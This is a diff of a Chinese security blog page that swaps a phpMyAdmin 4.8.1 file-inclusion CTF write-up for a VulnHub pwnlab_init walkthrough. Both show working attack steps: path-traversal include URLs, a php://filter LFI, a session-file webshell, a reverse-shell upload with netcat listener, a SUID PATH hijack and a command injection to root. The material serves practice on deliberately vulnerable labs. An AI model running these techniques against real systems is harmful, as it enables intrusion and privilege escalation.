@@ -6,30 +6,45 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
     
-    <title>墨者学院CTF(phpMyAdmin后台文件包含分析溯源) | RainMaker</title>
+    <title>pwnlab_init靶场记录 | RainMaker</title>
 
-    <meta name="description" content="&lt;h2 id=&#34;墨者学院CTF-phpMyAdmin后台文件包含分析溯源&#34;&gt;&lt;a href=&#34;#墨者学院CTF-phpMyAdmin后台文件包含分析溯源&#34; class=&#34;headerlink&#34; title=&#34;墨者学院CTF(phpMyAdmin后台文件包含分析溯源)&#34;&gt;&lt;/a&gt;&lt;strong&gt;墨者学院CTF(phpMyAdmin后台文件包含分析溯源)&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;靶场地址：&lt;/strong&gt;&lt;br&gt;&lt;a href=&#34;http://219.153.49.228:45122/&#34;&gt;http://219.153.49.228:45122/&lt;/a&gt;&lt;/p&gt;">
+    <meta name="description" content="&lt;h2 id=&#34;一、环境说明&#34;&gt;&lt;a href=&#34;#一、环境说明&#34; class=&#34;headerlink&#34; title=&#34;一、环境说明&#34;&gt;&lt;/a&gt;一、环境说明&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;目标：得到root权限&amp;amp;找到flag.txt&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;靶场下载地址：&lt;a href=&#34;https://www.vulnhub.com/entry/pwnlab-init,158/&#34;&gt;https://www.vulnhub.com/entry/pwnlab-init,158/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;靶机IP：192.168.252.134&lt;/p&gt;
+&lt;p&gt;KaliIP：192.168.252.132&lt;/p&gt;">
     <meta name="keywords" content="">
 
     
 
     <meta property="og:locale" content="cn" />
     <meta property="og:type" content="article" />
-    <meta property="og:title" content= "墨者学院CTF(phpMyAdmin后台文件包含分析溯源) | RainMaker"  />
-    <meta property="og:description" content= "&lt;h2 id=&#34;墨者学院CTF-phpMyAdmin后台文件包含分析溯源&#34;&gt;&lt;a href=&#34;#墨者学院CTF-phpMyAdmin后台文件包含分析溯源&#34; class=&#34;headerlink&#34; title=&#34;墨者学院CTF(phpMyAdmin后台文件包含分析溯源)&#34;&gt;&lt;/a&gt;&lt;strong&gt;墨者学院CTF(phpMyAdmin后台文件包含分析溯源)&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;靶场地址：&lt;/strong&gt;&lt;br&gt;&lt;a href=&#34;http://219.153.49.228:45122/&#34;&gt;http://219.153.49.228:45122/&lt;/a&gt;&lt;/p&gt;" />
-    <meta property="og:url" content="http://hasaki-h2.github.io/1db69a83.html" />
+    <meta property="og:title" content= "pwnlab_init靶场记录 | RainMaker"  />
+    <meta property="og:description" content= "&lt;h2 id=&#34;一、环境说明&#34;&gt;&lt;a href=&#34;#一、环境说明&#34; class=&#34;headerlink&#34; title=&#34;一、环境说明&#34;&gt;&lt;/a&gt;一、环境说明&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;目标：得到root权限&amp;amp;找到flag.txt&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;靶场下载地址：&lt;a href=&#34;https://www.vulnhub.com/entry/pwnlab-init,158/&#34;&gt;https://www.vulnhub.com/entry/pwnlab-init,158/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;靶机IP：192.168.252.134&lt;/p&gt;
+&lt;p&gt;KaliIP：192.168.252.132&lt;/p&gt;" />
+    <meta property="og:url" content="http://hasaki-h2.github.io/e90a4dc2.html" />
     <meta property="og:site_name" content="" />
     <meta property="article:author" content="" />
     <meta property="article:publisher" content="" />
-    <meta property="og:description" content="&lt;h2 id=&#34;墨者学院CTF-phpMyAdmin后台文件包含分析溯源&#34;&gt;&lt;a href=&#34;#墨者学院CTF-phpMyAdmin后台文件包含分析溯源&#34; class=&#34;headerlink&#34; title=&#34;墨者学院CTF(phpMyAdmin后台文件包含分析溯源)&#34;&gt;&lt;/a&gt;&lt;strong&gt;墨者学院CTF(phpMyAdmin后台文件包含分析溯源)&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;靶场地址：&lt;/strong&gt;&lt;br&gt;&lt;a href=&#34;http://219.153.49.228:45122/&#34;&gt;http://219.153.49.228:45122/&lt;/a&gt;&lt;/p&gt;" />
-    <meta name="twitter:title" content="墨者学院CTF(phpMyAdmin后台文件包含分析溯源) | RainMaker"/>
-    <meta name="twitter:description" content="&lt;h2 id=&#34;墨者学院CTF-phpMyAdmin后台文件包含分析溯源&#34;&gt;&lt;a href=&#34;#墨者学院CTF-phpMyAdmin后台文件包含分析溯源&#34; class=&#34;headerlink&#34; title=&#34;墨者学院CTF(phpMyAdmin后台文件包含分析溯源)&#34;&gt;&lt;/a&gt;&lt;strong&gt;墨者学院CTF(phpMyAdmin后台文件包含分析溯源)&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;靶场地址：&lt;/strong&gt;&lt;br&gt;&lt;a href=&#34;http://219.153.49.228:45122/&#34;&gt;http://219.153.49.228:45122/&lt;/a&gt;&lt;/p&gt;"/>
+    <meta property="og:description" content="&lt;h2 id=&#34;一、环境说明&#34;&gt;&lt;a href=&#34;#一、环境说明&#34; class=&#34;headerlink&#34; title=&#34;一、环境说明&#34;&gt;&lt;/a&gt;一、环境说明&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;目标：得到root权限&amp;amp;找到flag.txt&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;靶场下载地址：&lt;a href=&#34;https://www.vulnhub.com/entry/pwnlab-init,158/&#34;&gt;https://www.vulnhub.com/entry/pwnlab-init,158/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;靶机IP：192.168.252.134&lt;/p&gt;
+&lt;p&gt;KaliIP：192.168.252.132&lt;/p&gt;" />
+    <meta name="twitter:title" content="pwnlab_init靶场记录 | RainMaker"/>
+    <meta name="twitter:description" content="&lt;h2 id=&#34;一、环境说明&#34;&gt;&lt;a href=&#34;#一、环境说明&#34; class=&#34;headerlink&#34; title=&#34;一、环境说明&#34;&gt;&lt;/a&gt;一、环境说明&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;目标：得到root权限&amp;amp;找到flag.txt&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;靶场下载地址：&lt;a href=&#34;https://www.vulnhub.com/entry/pwnlab-init,158/&#34;&gt;https://www.vulnhub.com/entry/pwnlab-init,158/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;靶机IP：192.168.252.134&lt;/p&gt;
+&lt;p&gt;KaliIP：192.168.252.132&lt;/p&gt;"/>
     <script type="application/ld+json">
         {
-            "description": "&lt;h2 id=&#34;墨者学院CTF-phpMyAdmin后台文件包含分析溯源&#34;&gt;&lt;a href=&#34;#墨者学院CTF-phpMyAdmin后台文件包含分析溯源&#34; class=&#34;headerlink&#34; title=&#34;墨者学院CTF(phpMyAdmin后台文件包含分析溯源)&#34;&gt;&lt;/a&gt;&lt;strong&gt;墨者学院CTF(phpMyAdmin后台文件包含分析溯源)&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;靶场地址：&lt;/strong&gt;&lt;br&gt;&lt;a href=&#34;http://219.153.49.228:45122/&#34;&gt;http://219.153.49.228:45122/&lt;/a&gt;&lt;/p&gt;",
+            "description": "&lt;h2 id=&#34;一、环境说明&#34;&gt;&lt;a href=&#34;#一、环境说明&#34; class=&#34;headerlink&#34; title=&#34;一、环境说明&#34;&gt;&lt;/a&gt;一、环境说明&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;目标：得到root权限&amp;amp;找到flag.txt&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;靶场下载地址：&lt;a href=&#34;https://www.vulnhub.com/entry/pwnlab-init,158/&#34;&gt;https://www.vulnhub.com/entry/pwnlab-init,158/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;靶机IP：192.168.252.134&lt;/p&gt;
+&lt;p&gt;KaliIP：192.168.252.132&lt;/p&gt;",
             "author": { "@type": "Person", "name": "" },
             "@type": "BlogPosting",
-            "url": "http://hasaki-h2.github.io/1db69a83.html",
+            "url": "http://hasaki-h2.github.io/e90a4dc2.html",
             "publisher": {
             "@type": "Organization",
             "logo": {
@@ -38,11 +53,11 @@
             },
             "name": ""
             },
-            "headline": "墨者学院CTF(phpMyAdmin后台文件包含分析溯源) | RainMaker",
-            "datePublished": "2019-09-11T08:20:34.000Z",
+            "headline": "pwnlab_init靶场记录 | RainMaker",
+            "datePublished": "2023-02-03T07:47:00.000Z",
             "mainEntityOfPage": {
                 "@type": "WebPage",
-                "@id": "http://hasaki-h2.github.io/1db69a83.html"
+                "@id": "http://hasaki-h2.github.io/e90a4dc2.html"
             },
             "@context": "http://schema.org"
         }
@@ -185,7 +200,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckz2v4t6f003i3o4za2cgca3i" class="article article-type-post" itemscope
+    <article id="post-cldo87edm0000ld5yan4u04tt" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -201,7 +216,7 @@
             
   
     <h1 class="article-title" itemprop="name">
-      墨者学院CTF(phpMyAdmin后台文件包含分析溯源)
+      pwnlab_init靶场记录
     </h1>
   
 
@@ -211,7 +226,7 @@
         <div class="article-more-info article-more-info-post hairline">
 
             <div class="article-date">
-  <time datetime="2019-09-11T08:20:34.000Z" itemprop="datePublished">2019-09-11</time>
+  <time datetime="2023-02-03T07:47:00.000Z" itemprop="datePublished">2023-02-03</time>
 </div>
 
             
@@ -222,7 +237,7 @@
 
             
             <div class="article-tag">
-                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GetShell/" rel="tag">GetShell</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Lfi/" rel="tag">Lfi</a></li></ul>
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Lfi/" rel="tag">Lfi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
             </div>
             
 
@@ -235,31 +250,86 @@
         </div>
 
         <div class="article-entry post-inner-html hairline" itemprop="articleBody">
-            <h2 id="墨者学院CTF-phpMyAdmin后台文件包含分析溯源"><a href="#墨者学院CTF-phpMyAdmin后台文件包含分析溯源" class="headerlink" title="墨者学院CTF(phpMyAdmin后台文件包含分析溯源)"></a><strong>墨者学院CTF(phpMyAdmin后台文件包含分析溯源)</strong></h2><p><strong>靶场地址：</strong><br><a target="_blank" rel="noopener" href="http://219.153.49.228:45122/">http://219.153.49.228:45122/</a></p>
+            <h2 id="一、环境说明"><a href="#一、环境说明" class="headerlink" title="一、环境说明"></a>一、环境说明</h2><p><strong>目标：得到root权限&amp;找到flag.txt</strong></p>
+<p>靶场下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/pwnlab-init,158/">https://www.vulnhub.com/entry/pwnlab-init,158/</a></p>
+<p>靶机IP：192.168.252.134</p>
+<p>KaliIP：192.168.252.132</p>
 <span id="more"></span>
 
-<p><strong>相关知识：</strong></p>
-<p>  1.phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）<br>  2.php代码审计<br> 3.base64编码绕过</p>
-<p><strong>思路</strong>: 利用过滤规则绕过php文件包含的黑白名单限制，再利用php的session会话机制，包含一句话木马文件获取shell。<br><strong>获取key（弱口令登录就省了root/root）</strong>:</p>
-<p> 1.构造绕过白名单的url：<a href="http://219.153.49.228:45122/index.php?target=db_sql.php%253f/../../../../../etc/passwd">http://219.153.49.228:45122/index.php?target=db_sql.php%253f/../../../../../etc/passwd</a><br> 测试结果，成功：<img src="https://img-blog.csdnimg.cn/20190911153202348.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 2.执行SQL查询，写入一句话木马，此时由于php的session会话机制会把文件写入到服务器session的文件。<br> 常见session文件的保存目录：<br> /var/lib/php/sess_PHPSESSID<br>/var/lib/php/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br>①.写入一句话木马<img src="https://img-blog.csdnimg.cn/20190911154110233.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>②.构造服务器解析一句话木马的url:<a href="http://219.153.49.228:45122/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_h373iaao32rsf61ss52psvr6eck2vc5r">http://219.153.49.228:45122/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_h373iaao32rsf61ss52psvr6eck2vc5r</a><br><img src="https://img-blog.csdnimg.cn/2019091115431571.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>③.获取shell.<img src="https://img-blog.csdnimg.cn/20190911154530575.PNG" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190911154545263.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>疑问：</strong></p>
-<ol>
-<li>PHPSESSID是浏览器里边的cookie值，执行select 一句话木马后有的。</li>
-<li>不用再写什么phpinfo找写一句话木马路径了，麻烦不麻烦啊</li>
-<li>为什么是?target=db_sql.php，index.php源码里边的参数,后边自己看源码，db_sql.php是白名单中的文件，可以通过过滤规则。</li>
-<li>%253 是<code>“？”</code>的两次url编码，绕过滤用的，自己解码试试就知道了。</li>
-</ol>
-<p><strong>部分源码：</strong></p>
-<pre><code class="hljs plaintext">// If we have a valid target, let&#x27;s load that script instead
-if (! empty($_REQUEST[&#x27;target&#x27;])
-    &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])
-    &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])
-    &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)
-    &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])
-) &#123;
-    include $_REQUEST[&#x27;target&#x27;];
-    exit;
-&#125;</code></pre>
-<p><strong>完整版代码下载地址：</strong><br><a target="_blank" rel="noopener" href="https://www.phpmyadmin.net/files/4.8.1/">https://www.phpmyadmin.net/files/4.8.1/</a></p>
+<h2 id="二、练习记录"><a href="#二、练习记录" class="headerlink" title="二、练习记录"></a>二、练习记录</h2><p>扫描端口。</p>
+<pre><code class="hljs bash">nmap -p 1-65535 -T4 -sT 192.168.252.134</code></pre>
+
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203142330799.png" alt="image-20230203142330799" style="zoom:50%;" />
+
+<p>扫描漏洞</p>
+<pre><code class="hljs bash">nikto -h http://192.168.252.134</code></pre>
+
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203142528250.png" alt="image-20230203142528250" style="zoom:50%;" />
+
+<p>发现敏感文件，login.php，config.php，浏览器访问发现<code>page=login</code>，可能存在文件包含login.php。</p>
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203142811144.png" alt="image-20230203142811144" style="zoom:50%;" />
+
+<p>尝试包含config.php文件。</p>
+<pre><code class="hljs http">http://192.168.252.134/?page=php://filter/read=convert.base64-encode/resource=config</code></pre>
+
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203143355034.png" alt="image-20230203143355034" style="zoom:50%;" />
+
+<p>获取账户密码，尝试登录MYSQL数据库，获取用户账户密码，使用<code>kent/JWzXuBJJNy</code>成功登录web系统，发现文件上传功能。</p>
+<pre><code class="hljs bash">mysql -uroot -pH4u%QJ_H99 -h 192.168.252.134</code></pre>
+
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203143556444.png" alt="image-20230203143556444" style="zoom:50%;" />
+
+<p>包含upload.php，index.php两个文件，获取源码，可以看到**$_COOKIE[‘lang’]处可以通过lang参数传值包含非.php后缀的文件**,而login.php采用白名单限制，无法直接上传php文件，需要通过文件包含进行解析执行。</p>
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203144115022.png" alt="image-20230203144115022" style="zoom:40%;" />
+
+<p>使用kali自带的php反弹shell：<code>/usr/share/webshells/php/php-reverse-shell.php</code>，注意修改反连IP以及端口号。</p>
+<pre><code class="hljs bash">└─<span class="hljs-comment"># locate php-rever                                                         </span>
+/usr/share/laudanum/php/php-reverse-shell.php
+/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
+/usr/share/webshells/php/php-reverse-shell.php</code></pre>
+
+<p>监听端口后发送请求包，包含上传的webshell，获取reverse shell。</p>
+<pre><code class="hljs bash">nc -lvvp 1234
+curl http://192.168.252.134 -H <span class="hljs-string">&#x27;cookie:lang=../upload/364be8860e8d72b4358b5e88099a935a.png&#x27;</span></code></pre>
+
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203144919448.png" alt="image-20230203144919448" style="zoom:50%;" />
+
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203145021995.png" alt="image-20230203145021995" style="zoom:50%;" />
+
+<p>获取稳定pty终端，使用登录kane账户。</p>
+<pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></code></pre>
+
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203150059622.png" alt="image-20230203150059622" style="zoom:50%;" />
+
+<p>查找具有SUID权限的文件，发现msgmike文件，查看其文件内容，发现存在cat /home/mike/msg.txt命令执行，即其权限可能为mike用户权限，如果修改cat命令，则以kane用户权限运行的msgmike文件将调用cat，并且这个cat将以mike用户权限运行，实现提权至mike用户。</p>
+<pre><code class="hljs bash">find / -perm -4000 2&gt;/dev/null</code></pre>
+
+<p><img align="left" src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203150746440.png" alt="image-20230203150746440" style="zoom:50%;" /><img align="right" src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203151012240.png" alt="image-20230203151012240" style="zoom:50%;"  /></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># 修改cat</span>
+kane@pwnlab:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; cat
+<span class="hljs-comment"># 赋予执行权限</span>
+kane@pwnlab:~$ chmod +x cat
+<span class="hljs-comment"># 修改环境变量，以达到调用本地修改后的cat命令</span>
+kane@pwnlab:~$ <span class="hljs-built_in">export</span> PATH=/home/kane
+<span class="hljs-comment"># 还原环境变量</span>
+kane@pwnlab:~$ <span class="hljs-built_in">export</span> PATH=/usr/<span class="hljs-built_in">local</span>/sbin:/usr/<span class="hljs-built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></pre>
+
+<p>执行后可以看到成功切换到了mike权限用户，此时需要重新把环境变量还原。</p>
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203153227587.png" alt="image-20230203153227587" style="zoom:50%;" />
+
+<pre><code class="hljs bash"><span class="hljs-comment"># 切换到mike用户目录，发现msg2root文件</span>
+mike@pwnlab:~$ <span class="hljs-built_in">cd</span> /home/mike/
+<span class="hljs-comment"># 查看文件发现存在echo命令执行</span>
+mike@pwnlab:/home/mike$ cat msg2root
+<span class="hljs-comment"># 通过分号拼接命令执行/bin/bash 获取root用户权限</span>
+mike@pwnlab:/home/mike$ ./msg2root
+./msg2root
+Message <span class="hljs-keyword">for</span> root: <span class="hljs-built_in">test</span>;/bin/sh</code></pre>
+
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203154329636.png" alt="image-20230203154329636" style="zoom:50%;" />
+
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20230203154406591.png" alt="image-20230203154406591" style="zoom:50%;" />
+
 
         </div>
 
@@ -284,19 +354,10 @@ if (! empty($_REQUEST[&#x27;target&#x27;])
     
 <nav class="article-nav">
   
-    <a href="/4026433b.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <div class="article-nav-caption">下一篇</div>
-      <div class="article-nav-title">
-        
-          Upload-Labs回顾上篇（1-10节）
-        
-      </div>
-    </a>
   
-  
-    <a href="/911da9bb.html" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/765261ca.html" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-caption">上一篇</div>
-      <div class="article-nav-title">墨者学院CTF（SQL注入漏洞测试(参数加密)）</div>
+      <div class="article-nav-title">14Finger环境配置记录</div>
     </a>
   
 </nav>
@@ -305,15 +366,15 @@ if (! empty($_REQUEST[&#x27;target&#x27;])
     <section class="share">
         <div class="share-title">分享</div>
         <a class="share-item" target="_blank"
-            href="https://twitter.com/share?text=墨者学院CTF(phpMyAdmin后台文件包含分析溯源) - RainMaker&url=http%3A%2F%2Fhasaki-h2.github.io%2F1db69a83.html">
+            href="https://twitter.com/share?text=pwnlab_init靶场记录 - RainMaker&url=http%3A%2F%2Fhasaki-h2.github.io%2Fe90a4dc2.html">
             <ion-icon name="logo-twitter"></ion-icon>
         </a>
         <a class="share-item" target="_blank"
-            href="https://www.facebook.com/sharer.php?title=墨者学院CTF(phpMyAdmin后台文件包含分析溯源) - RainMaker&u=http%3A%2F%2Fhasaki-h2.github.io%2F1db69a83.html">
+            href="https://www.facebook.com/sharer.php?title=pwnlab_init靶场记录 - RainMaker&u=http%3A%2F%2Fhasaki-h2.github.io%2Fe90a4dc2.html">
             <ion-icon name="logo-facebook"></ion-icon>
         </a>
         <!-- <a class="share-item" target="_blank"
-            href="https://service.weibo.com/share/share.php?title=墨者学院CTF(phpMyAdmin后台文件包含分析溯源) - RainMaker&url=http://hasaki-h2.github.io/1db69a83.html&pic=">
+            href="https://service.weibo.com/share/share.php?title=pwnlab_init靶场记录 - RainMaker&url=http://hasaki-h2.github.io/e90a4dc2.html&pic=">
             <div class="n-icon n-icon-weibo"></div>
         </a> -->
     </section>
